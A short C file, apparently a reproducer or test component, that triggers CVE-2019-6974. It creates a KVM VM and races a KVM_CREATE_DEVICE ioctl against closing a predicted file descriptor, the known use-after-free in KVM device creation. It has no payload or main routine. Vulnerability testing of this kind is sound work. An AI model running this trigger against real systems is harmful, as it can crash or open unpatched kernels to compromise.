#include <err.h>
#include <fcntl.h>
#include <linux/kvm.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>

int predicted_fd = -1;
int vm;

void *cve_2019_6974_th1(void *dummy) {
  struct kvm_create_device cd = {.type = KVM_DEV_TYPE_VFIO,
                                 .fd = -1, // outparm
                                 .flags = 0};
  ioctl(vm, KVM_CREATE_DEVICE, &cd);
  return NULL;
}

void *cve_2019_6974_th2(void *dummy) {
  close(predicted_fd);
  return NULL;
}

void cve_2019_6974_init(void) {
  predicted_fd = -1;

  int kvm = open("/dev/kvm", O_RDWR);
  if (kvm == -1)
    perror("open");
  vm = ioctl(kvm, KVM_CREATE_VM, 0);
  if (vm == -1)
    perror("KVM_CREATE_VM");

  predicted_fd = dup(0);
  close(predicted_fd);
}
